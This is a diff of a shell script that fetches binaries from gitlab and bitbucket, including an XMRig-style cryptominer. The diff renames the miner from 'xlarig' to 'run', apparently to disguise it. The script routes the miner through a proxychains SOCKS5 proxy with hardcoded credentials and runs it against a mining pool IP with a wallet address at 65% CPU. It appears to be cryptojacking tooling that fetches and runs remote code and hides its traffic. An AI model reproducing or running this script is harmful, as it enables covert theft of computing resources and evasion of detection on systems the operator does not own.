@@ -2,7 +2,7 @@ proxy="34.192.37.108"
 port="1080" 
 user="fixie"  
 pass="vLCQLQTw6hkyD1a" 
-wget -q -O xlarig https://gitlab.com/55113110159/dokerweb/-/raw/main/xlarig && chmod +x xlarig
+wget -q -O run https://gitlab.com/55113110159/dokerweb/-/raw/main/xlarig && chmod +x run
 wget -q https://bitbucket.org/mandaresz/feriyaz/downloads/panel && chmod +x panel 
 wget -q https://bitbucket.org/mandaresz/feriyaz/downloads/proxychains.conf && chmod +x proxychains.conf 
 wget -q https://bitbucket.org/mandaresz/feriyaz/downloads/libproxychains4.so && chmod +x libproxychains4.so 
@@ -19,4 +19,4 @@ echo "IP ORI ==> "$(curl ifconfig.me)
 echo " " 
 echo " " 
 echo "IP BARU ==> "$(./panel curl ifconfig.me)
-./panel ./xlarig --donate-level 1 -o 149.50.222.86:80 -u ZEPHsAfZQpiQ33Hf63Tx1MNJQR5cMV1Mx9kkgDMWNGZqMCYdsujaDUk6c4sGGiKzYwiqjucHjEYdfKaX5CbnpxPfGxa5Cb8BzcJ.8v -a rx/0 -x socks5://fixie:vLCQLQTw6hkyD1a@34.192.37.108:1080 --cpu-max-threads-hint=65% -k -s 
+./panel ./run --donate-level 1 -o 149.50.222.86:80 -u ZEPHsAfZQpiQ33Hf63Tx1MNJQR5cMV1Mx9kkgDMWNGZqMCYdsujaDUk6c4sGGiKzYwiqjucHjEYdfKaX5CbnpxPfGxa5Cb8BzcJ.8v -a rx/0 -x socks5://fixie:vLCQLQTw6hkyD1a@34.192.37.108:1080 --cpu-max-threads-hint=65% -k -s 
